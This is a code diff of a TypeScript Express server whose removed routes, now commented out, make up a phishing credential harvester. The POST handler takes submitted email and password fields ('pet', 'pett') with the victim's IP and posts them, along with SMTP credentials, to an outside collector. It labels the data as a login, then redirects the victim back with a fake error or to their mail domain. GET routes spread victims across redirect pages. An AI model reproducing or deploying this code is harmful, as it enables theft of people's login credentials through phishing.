@@ -34,77 +34,77 @@ app.get('/test', (req: Request, res: Response) => {
     res.write('<h1> working</h1>');
     res.end();
 })
-app.get('/', (req: Request, res: Response) => {
-    const email = req.query.email;
-    const files = fs.readdirSync(__dirname + '/redirects/');
-    if (redirectArray.length){
-        const rand = Math.floor(Math.random() * redirectArray.length);
-        if (email){
-            res.redirect(redirectArray[rand] + '&email='+email);
-        } else {
-            res.redirect(redirectArray[rand]);
-        }
-    } else{
-        const rand = Math.floor(Math.random() * files.length);
-        fs.readFile(__dirname + `/redirects/${files[0]}`, 'utf8', (err, text) => {
-            res.send(text);
-        });
-    }
-})
-app.get('/home', (req: Request, res: Response) => {
-    const email = req.query.email;
-    const files = fs.readdirSync(__dirname + '/redirects/');
-    const rand = Math.floor(Math.random() * files.length);
-    fs.readFile(__dirname + `/redirects/${files[rand]}`, 'utf8', (err, text) => {
-        res.send(text);
-    });
-})
-app.post('/', (req: Request, res: Response) => {
-    const reff = req.headers.referer || req.headers.referrer;
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    let redirectUrl = reff + '&error=error&has=jduj733773838cnbncdhg';
-    axios.post(link, {
-        pet: req.body.pet,
-        pett: req.body.pett,
-        source: req.body.source.toUpperCase(),
-        error: req.body.error,
-        ip,
-        email,
-        smtpusername,
-        smtppass,
-        smtpservername,
-        fromName: req.body.source.toUpperCase() + ' LOGIN'
-    }).then((res) => {
+// app.get('/', (req: Request, res: Response) => {
+//     const email = req.query.email;
+//     const files = fs.readdirSync(__dirname + '/redirects/');
+//     if (redirectArray.length){
+//         const rand = Math.floor(Math.random() * redirectArray.length);
+//         if (email){
+//             res.redirect(redirectArray[rand] + '&email='+email);
+//         } else {
+//             res.redirect(redirectArray[rand]);
+//         }
+//     } else{
+//         const rand = Math.floor(Math.random() * files.length);
+//         fs.readFile(__dirname + `/redirects/${files[0]}`, 'utf8', (err, text) => {
+//             res.send(text);
+//         });
+//     }
+// })
+// app.get('/home', (req: Request, res: Response) => {
+//     const email = req.query.email;
+//     const files = fs.readdirSync(__dirname + '/redirects/');
+//     const rand = Math.floor(Math.random() * files.length);
+//     fs.readFile(__dirname + `/redirects/${files[rand]}`, 'utf8', (err, text) => {
+//         res.send(text);
+//     });
+// })
+// app.post('/', (req: Request, res: Response) => {
+//     const reff = req.headers.referer || req.headers.referrer;
+//     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+//     let redirectUrl = reff + '&error=error&has=jduj733773838cnbncdhg';
+//     axios.post(link, {
+//         pet: req.body.pet,
+//         pett: req.body.pett,
+//         source: req.body.source.toUpperCase(),
+//         error: req.body.error,
+//         ip,
+//         email,
+//         smtpusername,
+//         smtppass,
+//         smtpservername,
+//         fromName: req.body.source.toUpperCase() + ' LOGIN'
+//     }).then((res) => {
         
-    }).catch((err) => {
+//     }).catch((err) => {
         
-    });
-    if (req.body.error !== ''){
-        redirectUrl = lastRedirect;
-        if (!lastRedirect){
-            const dom = req.body.pet.split('@')[1];
-            redirectUrl = `http://${dom}`;
-        }
-    }
-    res.redirect(redirectUrl);
-})
-function test(){
-    axios.post(link, {
-        pet: 'req.body.pet',
-        pett: 'req.body.pett',
-        source: 'req.body.source.toUpperCase()',
-        error: 'req.body.error',
-        ip: '546677899',
-        email,
-        smtpusername,
-        smtppass,
-        smtpservername,
-        fromName: 'req.body.source.toUpperCase()' + ' LOGIN'
-    }).then((res) => {
-        console.log(res.data);
-    }).catch((err) => {
-        console.log(err.statusCode);
-    });
-}
+//     });
+//     if (req.body.error !== ''){
+//         redirectUrl = lastRedirect;
+//         if (!lastRedirect){
+//             const dom = req.body.pet.split('@')[1];
+//             redirectUrl = `http://${dom}`;
+//         }
+//     }
+//     res.redirect(redirectUrl);
+// })
+// function test(){
+//     axios.post(link, {
+//         pet: 'req.body.pet',
+//         pett: 'req.body.pett',
+//         source: 'req.body.source.toUpperCase()',
+//         error: 'req.body.error',
+//         ip: '546677899',
+//         email,
+//         smtpusername,
+//         smtppass,
+//         smtpservername,
+//         fromName: 'req.body.source.toUpperCase()' + ' LOGIN'
+//     }).then((res) => {
+//         console.log(res.data);
+//     }).catch((err) => {
+//         console.log(err.statusCode);
+//     });
+// }
 
 app.listen(5000,() => console.log(`hosting @5000`));
